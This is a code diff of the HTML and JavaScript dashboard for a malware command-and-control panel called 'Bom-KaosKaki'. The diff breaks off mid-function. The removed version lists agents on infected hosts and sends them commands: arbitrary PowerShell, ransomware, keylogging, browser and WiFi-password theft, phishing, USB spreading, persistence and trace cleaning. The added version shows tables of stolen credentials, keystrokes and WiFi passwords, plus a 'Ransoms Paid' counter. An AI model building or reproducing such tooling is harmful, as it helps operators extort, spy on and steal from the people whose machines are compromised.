@@ -1,930 +1,467 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bom-KaosKaki C2 Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><style>
+    <title>Bom-KaosKaki Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
-
-        body {
-            background: #f8f9fa;
-            color: #333;
             font-family: 'Inter', -apple-system, sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            display: flex;
+            height: 100vh;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 260px;
+            background: #fff;
+            border-right: 1px solid #e9ecef;
+            display: flex;
+            flex-direction: column;
+            padding: 24px 20px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 18px;
+            color: #111;
+            margin-bottom: 40px;
+            padding-left: 8px;
+        }
+        .logo-icon {
+            font-size: 24px;
+        }
+        .menu-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            color: #555;
             font-size: 14px;
-            line-height: 1.6;
-            padding: 20px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 4px;
+            transition: all 0.2s;
+        }
+        .menu-item:hover:not(.active) {
+            background: #f1f3f5;
+        }
+        .menu-item.active {
+            background: #111;
+            color: #fff;
+        }
+        .menu-icon {
+            width: 18px;
+            text-align: center;
+        }
+        .logout {
+            margin-top: auto;
+            color: #d32f2f;
+        }
+        .logout:hover {
+            background: #ffebee;
         }
 
+        /* Main Content */
+        .main {
+            flex: 1;
+            padding: 40px;
+            overflow-y: auto;
+        }
         .header {
-            border-bottom: 2px solid #e9ecef;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 30px;
         }
-
-        .header h1 {
-            font-size: 22px;
-            letter-spacing: 3px;
-        }
-
-        .header .info {
-            color: #888;
-            font-size: 12px;
-        }
-
-        .stats {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-
-        .stat-box {
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 10px 15px;
-            min-width: 120px;
-        }
-
-        .stat-box .num {
+        h1 {
             font-size: 24px;
-            font-weight: bold;
+            font-weight: 600;
+            color: #111;
+        }
+        .status-btn {
+            background: #fff;
+            border: 1px solid #e9ecef;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #555;
+            font-weight: 500;
         }
 
-        .stat-box .label {
-            font-size: 10px;
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: #fff;
+            border: 1px solid #e9ecef;
+            border-radius: 12px;
+            padding: 24px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+        .stat-val {
+            font-size: 28px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 6px;
+        }
+        .stat-label {
+            font-size: 12px;
             color: #888;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-weight: 500;
         }
 
-        .section-title {
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            padding-bottom: 5px;
+        /* Tables Grid */
+        .tables-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+        .table-card {
+            background: #fff;
+            border: 1px solid #e9ecef;
+            border-radius: 12px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .table-header {
+            padding: 20px;
             border-bottom: 1px solid #e9ecef;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 600;
+            font-size: 15px;
+            color: #111;
         }
-
+        .badge-live {
+            background: #e6f4ea;
+            color: #1e8e3e;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-bottom: 20px;
-            font-size: 12px;
         }
-
-        th,
-        td {
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 6px 8px;
-            text-align: left;
-        }
-
         th {
-            background: #f8f9fa;
-            color: #555;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        tr:hover {
-            background: #f1f3f5;
-        }
-
-        .status-active {
-            color: #555;
-        }
-
-        .status-idle {
-            color: #f57c00;
-        }
-
-        .status-dead {
-            color: #d32f2f;
-        }
-
-        .status-completed {
-            color: #555;
-        }
-
-        .status-pending {
-            color: #f57c00;
-        }
-
-        .status-error {
-            color: #d32f2f;
-        }
-
-        code {
-            font-family: 'Inter', -apple-system, sans-serif;
-        }
-
-        .session-id {
-            color: #00a4ef;
-        }
-
-        button,
-        select,
-        input,
-        textarea {
-            background: #f8f9fa;
-            color: #333;
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 4px 8px;
-            font-family: 'Inter', -apple-system, sans-serif;
+            text-align: left;
+            padding: 14px 20px;
             font-size: 12px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background: #f8f9fa;
-            border-color: #555;
-        }
-
-        button:active {
-            background: #0f0;
-            color: #000;
-        }
-
-        select option {
-            background: #f8f9fa;
-            color: #333;
-        }
-
-        input:focus,
-        textarea:focus,
-        select:focus {
-            outline: none;
-            border-color: #555;
-        }
-
-        textarea {
-            width: 100%;
-            resize: vertical;
-        }
-
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-overlay.active {
-            display: flex;
-        }
-
-        .modal {
-            background: #f8f9fa;
-            border: 2px solid #333;
-            padding: 20px;
-            min-width: 500px;
-            max-width: 700px;
-        }
-
-        .modal h2 {
-            font-size: 16px;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #e9ecef;
-            padding-bottom: 8px;
-        }
-
-        .modal label {
-            display: block;
-            font-size: 11px;
+            font-weight: 500;
             color: #888;
-            margin-top: 10px;
-            margin-bottom: 3px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .modal .btn-row {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-            justify-content: flex-end;
-        }
-
-        .modal .form-group {
-            margin-bottom: 10px;
-        }
-
-        .tab-bar {
-            display: flex;
-            gap: 0;
-            margin-bottom: 15px;
             border-bottom: 1px solid #e9ecef;
         }
-
-        .tab-btn {
-            padding: 8px 16px;
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            border-bottom: 2px solid transparent;
-            background: #f8f9fa;
-            color: #888;
-            cursor: pointer;
-            font-family: 'Inter', -apple-system, sans-serif;
-            font-size: 12px;
-        }
-
-        .tab-btn.active { border-bottom-color: #00a4ef; color: #00a4ef;
-            background: #f8f9fa;
+        td {
+            padding: 16px 20px;
+            font-size: 13px;
             color: #555;
-            border-color: #555;
+            border-bottom: 1px solid #f1f3f5;
         }
-
-        .tab-btn:hover {
-            color: #333;
+        tr:last-child td {
+            border-bottom: none;
         }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .exfil-item {
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 8px;
-            margin-bottom: 8px;
-            font-size: 12px;
-        }
-
-        .exfil-item .header {
-            display: flex;
-            justify-content: space-between;
-            color: #888;
-            font-size: 11px;
-            border: none;
-            padding: 0;
-            margin-bottom: 5px;
-        }
-
-        .exfil-item .header .type {
-            color: #00a4ef;
-            font-weight: bold;
-        }
-
-        .exfil-item pre {
-            background: #f1f3f5;
-            padding: 8px;
-            font-size: 11px;
-            color: #555;
-            overflow-x: auto;
-            max-height: 150px;
-            overflow-y: auto;
-            margin-top: 5px;
-        }
-
-        .exfil-item img {
-            max-width: 200px;
-            max-height: 150px;
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            cursor: pointer;
-            margin-top: 5px;
-        }
-
-        .exfil-item img:hover {
-            border-color: #555;
-        }
-
-        .console-log {
-            background: #f1f3f5;
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-size: 12px;
-            line-height: 1.5;
-        }
-
-        .console-log .entry {
-            padding: 2px 0;
-            border-bottom: 1px solid #111;
-        }
-
-        .console-log .time {
-            color: #555;
-        }
-
-        .console-log .info {
-            color: #555;
-        }
-
-        .console-log .error {
-            color: #d32f2f;
-        }
-
-        .console-log .warn {
-            color: #f57c00;
-        }
-
-        ::-webkit-scrollbar {
-            width: 4px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #f8f9fa;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #333;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #555;
-        }
-
-        .toast-container {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 9999;
-        }
-
-        .toast {
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 10px 15px;
-            margin-bottom: 8px;
-            font-size: 12px;
-            min-width: 250px;
-        }
-
-        .toast.success {
-            border-color: #555;
-        }
-
-        .toast.error {
-            border-color: #d32f2f;
-        }
-
-        .toast.warn {
-            border-color: #f57c00;
-        }
-
-        .toast.info {
-            border-color: #00a4ef;
-        }
-
-        .dropdown {
-            background: #f8f9fa;
-            color: #333;
-            border: 1px solid #e9ecef; border-radius: 8px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            padding: 3px 5px;
-            font-family: 'Inter', -apple-system, sans-serif;
-            font-size: 11px;
+        .empty-row {
+            text-align: center;
+            padding: 30px;
+            color: #aaa;
+            font-style: italic;
         }
     </style>
 </head>
-
 <body>
 
-    <div class="toast-container" id="toastContainer"></div>
-
-    <div class="header">
-        <h1># Bom-KaosKaki C2</h1>
-        <div class="info">
-            <span id="clock"></span> |
-            <span id="agentCount">0 agents</span>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="logo">
+            <span class="logo-icon">🧦</span> Bom Kaos Kaki
+        </div>
+        
+        <div class="menu-item active">
+            <span class="menu-icon">⊞</span> Overview
+        </div>
+        <div class="menu-item">
+            <span class="menu-icon">👥</span> Targets
+        </div>
+        <div class="menu-item">
+            <span class="menu-icon">🔒</span> Credentials
+        </div>
+        <div class="menu-item">
+            <span class="menu-icon">✔️</span> Payments
+        </div>
+        
+        <div class="menu-item logout" onclick="window.location.href='/api/login'">
+            <span class="menu-icon">→</span> Logout
         </div>
     </div>
 
-    <div class="stats">
-        <div class="stat-box">
-            <div class="num" id="statTotal">0</div>
-            <div class="label">Total Agents</div>
+    <!-- Main Content -->
+    <div class="main">
+        <div class="header">
+            <h1>Overview Dashboard</h1>
+            <div class="status-btn" id="syncStatus">Loading...</div>
         </div>
-        <div class="stat-box">
-            <div class="num" id="statActive">0</div>
-            <div class="label">Active</div>
-        </div>
-        <div class="stat-box">
-            <div class="num" id="statPending">0</div>
-            <div class="label">Pending Cmd</div>
-        </div>
-        <div class="stat-box">
-            <div class="num" id="statExfil">0</div>
-            <div class="label">Exfil (24h)</div>
-        </div>
-    </div>
 
-    <div class="tab-bar">
-        <div class="tab-btn active" onclick="switchTab('agents')">[ Agents ]</div>
-        <div class="tab-btn" onclick="switchTab('commands')">[ Commands ]</div>
-        <div class="tab-btn" onclick="switchTab('exfil')">[ Exfiltrated ]</div>
-        <div class="tab-btn" onclick="switchTab('console')">[ Console ]</div>
-        <div style="flex-grow:1;"></div>
-        <button onclick="refreshAll()" style="border-color:#555;">âŸ³ Refresh</button>
-    </div>
-
-    <!-- TAB: AGENTS -->
-    <div class="tab-content active" id="tab-agents">
-        <div class="section-title">
-            ACTIVE SESSIONS
-            <button onclick="sendCommandToAll()" style="margin-left:10px;border-color:#88f;">â–¶ Command to All</button>
-            <button onclick="loadAgents()" style="margin-left:5px;">âŸ³</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Session ID</th>
-                    <th>Hostname</th>
-                    <th>User</th>
-                    <th>OS</th>
-                    <th>IP</th>
-                    <th>Admin</th>
-                    <th>Heartbeat</th>
-                    <th>Status</th>
-                    <th width="180">Actions</th>
-                </tr>
-            </thead>
-            <tbody id="agentsBody">
-                <tr>
-                    <td colspan="9" style="color:#555;text-align:center;">Loading agents...</td>
-                </tr>
-            </tbody>
-        </table>
-    </div>
-
-    <!-- TAB: COMMANDS -->
-    <div class="tab-content" id="tab-commands">
-        <div class="section-title">COMMAND HISTORY</div>
-        <table>
-            <thead>
-                <tr>
-                    <th>ID</th>
-                    <th>Session</th>
-                    <th>Type</th>
-                    <th>Status</th>
-                    <th>Time</th>
-                    <th>Result</th>
-                </tr>
-            </thead>
-            <tbody id="commandsBody">
-                <tr>
-                    <td colspan="6" style="color:#555;text-align:center;">Loading...</td>
-                </tr>
-            </tbody>
-        </table>
-    </div>
-
-    <!-- TAB: EXFIL -->
-    <div class="tab-content" id="tab-exfil">
-        <div class="section-title">
-            EXFILTRATED DATA
-            <span style="float:right;">
-                <select id="exfilFilter" onchange="loadExfil()">
-                    <option value="all">All Types</option>
-                    <option value="screenshot">Screenshots</option>
-                    <option value="keylog">Keylogs</option>
-                    <option value="clipboard">Clipboard</option>
-                    <option value="browser">Browser</option>
-                    <option value="wifi">WiFi</option>
-                    <option value="command_result">Cmd Results</option>
-                    <option value="system">System Info</option>
-                    <option value="ransomware">Ransomware</option>
-                    <option value="phishing">Phishing</option>
-                    <option value="persistence">Persistence</option>
-                </select>
-                <input type="text" id="exfilSearch" placeholder="Session ID..." style="width:150px;margin-left:5px;">
-                <button onclick="loadExfil()" style="margin-left:5px;">Search</button>
-            </span>
-        </div>
-        <div id="exfilData">Loading...</div>
-    </div>
-
-    <!-- TAB: CONSOLE -->
-    <div class="tab-content" id="tab-console">
-        <div class="section-title">
-            C2 CONSOLE LOG
-            <button onclick="clearConsole()" style="float:right;">Clear</button>
-        </div>
-        <div class="console-log" id="consoleLog">
-            <div class="entry"><span class="time">[--:--:--]</span> <span class="info">Bom-KaosKaki C2
-                    initialized</span></div>
-        </div>
-    </div>
-
-    <!-- COMMAND MODAL -->
-    <div class="modal-overlay" id="commandModal">
-        <div class="modal">
-            <h2 id="modalTitle">â–¶ Send Command</h2>
-
-            <input type="hidden" id="cmdSessionId">
-            <input type="hidden" id="cmdIsAll">
-
-            <div class="form-group">
-                <label>Target Session</label>
-                <input type="text" id="cmdTargetDisplay" readonly style="width:100%;">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-val" id="statTargets">0</div>
+                <div class="stat-label">Total Targets</div>
             </div>
-
-            <div class="form-group">
-                <label>Command Type</label>
-                <select id="cmdType" onchange="onCmdTypeChange()" style="width:100%;">
-                    <option value="exec">exec - Execute PowerShell Command</option>
-                    <option value="ransomware">ransomware - Ransomware Attack</option>
-                    <option value="keylogger">keylogger - Start Keylogger</option>
-                    <option value="stop_keylogger">stop_keylogger - Stop Keylogger</option>
-                    <option value="clipboard">clipboard - Steal Clipboard</option>
-                    <option value="screenshot">screenshot - Take Screenshot</option>
-                    <option value="phishing">phishing - Deploy Phishing Page</option>
-                    <option value="spread">spread - USB Spread</option>
-                    <option value="persistence">persistence - Install Persistence</option>
-                    <option value="spyware">spyware - Deploy Spyware Monitor</option>
-                    <option value="clean">clean - Clean Traces</option>
-                    <option value="steal_browser">steal_browser - Steal Browser Data</option>
-                    <option value="steal_wifi">steal_wifi - Steal WiFi Passwords</option>
-                    <option value="system_info">system_info - Get System Info</option>
-                    <option value="uninstall">uninstall - Uninstall Agent</option>
-                </select>
+            <div class="stat-card">
+                <div class="stat-val" id="statActive">0</div>
+                <div class="stat-label">Active (last 1h)</div>
             </div>
-
-            <div class="form-group" id="execParams" style="display:none;">
-                <label>PowerShell Script</label>
-                <textarea id="cmdExecScript" rows="6" placeholder="Write PowerShell commands to execute..."></textarea>
+            <div class="stat-card">
+                <div class="stat-val" id="statCreds">0</div>
+                <div class="stat-label">Credentials Stolen</div>
             </div>
-
-            <div class="form-group">
-                <label>Scheduled Time (ISO format, leave empty for immediate)</label>
-                <input type="text" id="cmdScheduledTime" placeholder="e.g. 2026-06-05T15:00:00Z or blank for now"
-                    style="width:100%;">
+            <div class="stat-card">
+                <div class="stat-val" id="statKeylogs">0</div>
+                <div class="stat-label">Keylog Entries</div>
             </div>
-
-            <div class="btn-row">
-                <button onclick="closeModal('commandModal')">Cancel</button>
-                <button onclick="executeCommand()" style="border-color:#0f0;">â–¶ Execute</button>
+            <div class="stat-card">
+                <div class="stat-val" id="statWifi">0</div>
+                <div class="stat-label">WiFi Profiles</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="statRansoms">0</div>
+                <div class="stat-label">Ransoms Paid</div>
             </div>
         </div>
-    </div>
 
-    <!-- SCREENSHOT MODAL -->
-    <div class="modal-overlay" id="screenshotModal">
-        <div class="modal" style="text-align:center;">
-            <img id="screenshotFull" src="" style="max-width:100%;border:1px solid #333;">
-            <div class="btn-row" style="justify-content:center;">
-                <button onclick="closeModal('screenshotModal')">Close</button>
+        <div class="tables-grid">
+            
+            <!-- Active Sessions -->
+            <div class="table-card">
+                <div class="table-header">
+                    <span>Active Sessions</span>
+                    <span class="badge-live">Live</span>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session ID</th>
+                            <th>Target</th>
+                            <th>IP Address</th>
+                            <th>Status</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tblSessions">
+                        <tr><td colspan="5" class="empty-row">No active sessions</td></tr>
+                    </tbody>
+                </table>
             </div>
+
+            <!-- Captured Credentials -->
+            <div class="table-card">
+                <div class="table-header">
+                    <span>Captured Credentials</span>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Origin URL</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tblCreds">
+                        <tr><td colspan="3" class="empty-row">No credentials captured</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Live Keylogger -->
+            <div class="table-card">
+                <div class="table-header">
+                    <span>Live Keylogger</span>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>Content</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tblKeylog">
+                        <tr><td colspan="3" class="empty-row">No keylogs recorded</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Extracted WiFi Profiles -->
+            <div class="table-card">
+                <div class="table-header">
+                    <span>Extracted WiFi Profiles</span>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>SSID</th>
+                            <th>Password</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tblWifi">
+                        <tr><td colspan="3" class="empty-row">No profiles extracted</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
         </div>
     </div>
 
     <script>
-        // ============ GLOBALS ============
         const API = '';
-        let agents = [];
-        let refreshTimer = null;
 
-        // ============ TOAST ============
-        function showToast(msg, type = 'info') {
-            const c = document.getElementById('toastContainer');
-            const t = document.createElement('div');
-            t.className = 'toast ' + type;
-            t.textContent = msg;
-            c.appendChild(t);
-            setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 500); }, 4000);
-        }
-
-        // ============ CONSOLE ============
-        function log(msg, type = 'info') {
-            const el = document.getElementById('consoleLog');
-            const t = new Date().toLocaleTimeString();
-            const d = document.createElement('div');
-            d.className = 'entry';
-            d.innerHTML = `<span class="time">[${t}]</span> <span class="${type}">${msg}</span>`;
-            el.appendChild(d);
-            el.scrollTop = el.scrollHeight;
-        }
-
-        function clearConsole() {
-            document.getElementById('consoleLog').innerHTML = '';
-            log('Console cleared', 'warn');
-        }
-
-        // ============ CLOCK ============
-        function updateClock() {
-            document.getElementById('clock').textContent = new Date().toLocaleString();
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-
-        // ============ TABS ============
-        function switchTab(name) {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.querySelector(`.tab-btn[onclick*="${name}"]`).classList.add('active');
-            document.getElementById('tab-' + name).classList.add('active');
-        }
-
-        // ============ MODAL ============
-        function openModal(id) { document.getElementById(id).classList.add('active'); }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
-        document.addEventListener('keydown', e => { if (e.key === 'Escape') { document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); } });
-
-        // ============ AGENTS ============
-        async function loadAgents() {
+        async function fetchDashboardData() {
             try {
-                const r = await fetch(API + '/api/agents');
-                const d = await r.json();
-                if (!d.success) throw new Error(d.error);
+                document.getElementById('syncStatus').textContent = 'Syncing...';
+                
+                // Fetch Agents
+                const rAgents = await fetch(API + '/api/agents');
+                const dAgents = await rAgents.json();
+                let agents = dAgents.success ? (dAgents.agents || []) : [];
+                
+                // Fetch Exfil Data
+                const rExfil = await fetch(API + '/api/exfil_data');
+                const dExfil = await rExfil.json();
+                let exfil = dExfil.success ? (dExfil.data || []) : [];
 
-                agents = d.agents || [];
-                const tbody = document.getElementById('agentsBody');
-
-                if (agents.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="9" style="color:#555;text-align:center;">No agents connected</td></tr>';
-                } else {
-                    tbody.innerHTML = agents.map(a => {
-                        const hb = a.lastHeartbeat ? new Date(a.lastHeartbeat._seconds * 1000) : null;
-                        const diff = hb ? (new Date() - hb) / 1000 : 99999;
-                        let status, cls;
-                        if (diff < 60) { status = 'ACTIVE'; cls = 'status-active'; }
-                        else if (diff < 300) { status = 'IDLE'; cls = 'status-idle'; }
-                        else { status = 'DEAD'; cls = 'status-dead'; }
-
-                        const timeAgo = diff < 60 ? Math.floor(diff) + 's' :
-                            diff < 3600 ? Math.floor(diff / 60) + 'm' :
-                                Math.floor(diff / 3600) + 'h';
-
-                        return `<tr>
-                    <td><code class="session-id">${a.sessionId || a.id || '???'}</code></td>
-                    <td>${a.hostname || '?'}</td>
-                    <td>${a.username || '?'}</td>
-                    <td>${(a.os || '?').substring(0, 30)}</td>
-                    <td>${a.ip || '?'}</td>
-                    <td>${a.isAdmin ? 'âœ“' : ''}</td>
-                    <td style="color:#555;font-size:11px;">${timeAgo}</td>
-                    <td class="${cls}">${status}</td>
-                    <td>
-                        <select class="dropdown" id="cmd-${a.sessionId}" style="margin-bottom:2px;">
-                            <option value="screenshot">ðŸ“· Screenshot</option>
-                            <option value="keylogger">âŒ¨ Keylogger</option>
-                            <option value="stop_keylogger">â¹ Stop Keylogger</option>
-                            <option value="ransomware">ðŸ’€ Ransomware</option>
-                            <option value="clipboard">ðŸ“‹ Clipboard</option>
-                            <option value="system_info">â„¹ System Info</option>
-                            <option value="steal_wifi">ðŸ“¡ WiFi</option>
-                            <option value="steal_browser">ðŸŒ Browser</option>
-                            <option value="persistence">ðŸ”— Persistence</option>
-                            <option value="spread">ðŸ’¾ USB Spread</option>
-                            <option value="spyware">ðŸ‘ Spyware</option>
-                            <option value="phishing">ðŸŽ£ Phishing</option>
-                            <option value="clean">ðŸ§¹ Clean</option>
-                            <option value="exec">âš¡ Exec</option>
-                            <option value="uninstall">âŒ Uninstall</option>
-                        </select>
-                        <button onclick="quickCmd('${a.sessionId}')" style="font-size:11px;padding:2px 6px;">â–¶</button>
-                        <button onclick="openCmdModal('${a.sessionId}')" style="font-size:11px;padding:2px 6px;" title="Advanced">âš™</button>
-                    </td>
-                </tr>`;
-                    }).join('');
-                }
-
-                const active = agents.filter(a => {
-                    const hb = a.lastHeartbeat ? new Date(a.lastHeartbeat._seconds * 1000) : null;
-                    return hb && (new Date() - hb) < 60000;
-                }).length;
-
-                document.getElementById('statTotal').textContent = agents.length;
-                document.getElementById('statActive').textContent = active;
-                document.getElementById('agentCount').textContent = agents.length + ' agents';
-                log('Loaded ' + agents.length + ' agents (' + active + ' active)', 'info');
-            } catch (e) {
-                log('Agent load failed: ' + e.message, 'error');
-                document.getElementById('agentsBody').innerHTML = '<tr><td colspan="9" style="color:#f00;text-align:center;">Failed to load</td></tr>';
+                updateDashboard(agents, exfil);
+                document.getElementById('syncStatus').textContent = 'Synced';
+                
+            } catch(e) {
+                console.error(e);
+                document.getElementById('syncStatus').textContent = 'Error';
             }
         }
 
-        // ============ QUICK COMMAND ============
-        async function quickCmd(sessionId) {
-            const sel = document.getElementById('cmd-' + sessionId);
-            const type = sel.value;
+        function updateDashboard(agents, exfil) {
+            // 1. Stats
+            const active1h = agents.filter(a => {
+                if(!a.lastHeartbeat) return false;
+                const ms = a.lastHeartbeat._seconds * 1000;
+                return (Date.now() - ms) < 3600000; // 1 hour
+            }).length;
 
-            if (type === 'exec') {
-                openCmdModal(sessionId);
-                document.getElementById('cmdType').value = 'exec';
-                onCmdTypeChange();
-                return;
+            const creds = exfil.filter(e => e.type === 'phishing');
+            const keylogs = exfil.filter(e => e.type === 'keylog');
+            const wifis = exfil.filter(e => e.type === 'wifi');
+
+            document.getElementById('statTargets').textContent = agents.length;
+            document.getElementById('statActive').textContent = active1h;
+            document.getElementById('statCreds').textContent = creds.length;
+            document.getElementById('statKeylogs').textContent = keylogs.length;
+            document.getElementById('statWifi').textContent = wifis.length;
+            document.getElementById('statRansoms').textContent = '0';
+
+            // 2. Active Sessions Table
+            const tblSessions = document.getElementById('tblSessions');
+            const activeSessions = agents.filter(a => {
+                if(!a.lastHeartbeat) return false;
+                return (Date.now() - a.lastHeartbeat._seconds * 1000) < 3600000;
+            }).slice(0, 5);
+
+            if(activeSessions.length > 0) {
+                tblSessions.innerHTML = activeSessions.map(a => `
+                    <tr>
+                        <td style="color:#00a4ef; font-weight:500;">${(a.sessionId||'').substring(0,8)}</td>
+                        <td>${a.hostname||'Unknown'}</td>
+                        <td>${a.ip||'-'}</td>
+                        <td><span style="color:#1e8e3e;">Online</span></td>
+                        <td style="cursor:pointer; color:#888;">...</td>
+                    </tr>
+                `).join('');
             }
 
-            try {
-                const r = await fetch(API + '/api/send_command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target_session: sessionId,
-                        command_type: type,
-                        parameters: {},
-                        scheduled_time: new Date().toISOString()
-                    })
-                });
-                const d = await r.json();
-                if (d.success) {
-                    showToast('â–¶ ' + type + ' sent to ' + sessionId.substring(0, 8) + '...', 'success');
-                    log('Sent [' + type + '] to ' + sessionId, 'info');
-                    loadCommands();
-                } else {
-                    showToast('Error: ' + d.error, 'error');
-                }
-            } catch (e) {
-                showToast('Error: ' + e.message, 'error');
-            }
-        }
-
-        // ============ COMMAND MODAL ============
-        function openCmdModal(sessionId) {
-            document.getElementById('cmdSessionId').value = sessionId;
-            document.getElementById('cmdIsAll').value = 'false';
-            document.getElementById('cmdTargetDisplay').value = sessionId;
-            document.getElementById('modalTitle').textContent = 'â–¶ Send Command to ' + sessionId.substring(0, 12) + '...';
-            document.getElementById('cmdType').value = 'exec';
-            document.getElementById('cmdExecScript').value = '';
-            document.getElementById('cmdScheduledTime').value = '';
-            onCmdTypeChange();
-            openModal('commandModal');
-        }
-
-        function sendCommandToAll() {
-            document.getElementById('cmdSessionId').value = 'all';
-            document.getElementById('cmdIsAll').value = 'true';
-            document.getElementById('cmdTargetDisplay').value = 'ALL ACTIVE AGENTS';
-            document.getElementById('modalTitle').textContent = 'â–¶ Send Command to ALL Agents';
-            document.getElementById('cmdType').value = 'exec';
-            document.getElementById('cmdExecScript').value = '';
-            document.getElementById('cmdScheduledTime').value = '';
-            onCmdTypeChange();
-            openModal('commandModal');
-        }
-
-        function onCmdTypeChange() {
-            const type = document.getElementById('cmdType').value;
-            document.getElementById('execParams').style.display = type === 'exec' ? 'block' : 'none';
-        }
-
-        async function executeCommand() {
-            const sessionId = document.getElementById('cmdSessionId').value;
-            const type = document.getElementById('cmdType').value;
-            const sched = document.getElementById('cmdScheduledTime').value || new Date().toISOString();
-
-            let params = {};
-            if (type === 'exec') {
-                const script = document.getElementById('cmdExecScript').value;
-                if (!script.trim()) { showToast('Enter PowerShell script', 'error'); return; }
-                params.script = script;
+            // 3. Credentials Table
+            const tblCreds = document.getElementById('tblCreds');
+            if(creds.length > 0) {
+                tblCreds.innerHTML = creds.slice(0, 5).map(c => {
+                    let user = '-', pass = '-', url = 'Microsoft Phishing';
+                    try {
+                        const parsed = JSON.parse(c.data);
+                        user = parsed.email || parsed.username || '-';
+                        pass = parsed.password ? '********' : '-';
+                    } catch(e) {}
+                    return `
+                    <tr>
+                        <td>${url}</td>
+                        <td style="font-weight:500;">${user}</td>
+                        <td>${pass}</td>
+                    </tr>
+                `}).join('');
             }
 
